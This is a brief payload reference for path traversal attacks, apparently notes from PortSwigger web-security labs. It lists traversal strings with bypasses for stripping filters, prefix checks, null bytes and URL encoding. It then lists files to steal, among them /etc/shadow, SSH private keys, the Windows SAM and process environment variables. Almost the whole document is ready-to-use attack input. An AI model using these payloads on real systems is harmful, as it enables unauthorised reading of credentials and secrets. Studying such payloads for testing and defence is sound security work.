# Path Traversal - Payload Reference

## Basic Traversal
```
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
```

## Non-recursive Strip Bypass
```
....//....//....//etc/passwd    # Server strips ../ once, leaving ../
....\\....\\....\\windows\\system32\\config\\sam
```

## Absolute Path
```
/etc/passwd
/windows/system32/config/sam
```

## Validation Bypass
```
/var/www/images/../../../etc/passwd    # Starts with expected prefix
/var/www/images/../../../etc/passwd%00.jpg  # Null byte (older PHP)
```

## URL Encoding Bypass
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f    # Double encoding
```

## Target Files
```
/etc/passwd                          # Linux user list
/etc/shadow                          # Linux passwords (root only)
/etc/hosts                           # Hosts file
/proc/self/environ                   # Environment variables
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Apache logs
/home/carlos/secret                  # PortSwigger lab target
/root/.ssh/id_rsa                    # SSH keys
C:\windows\system32\config\sam       # Windows SAM
C:\windows\win.ini                   # Windows INI
```
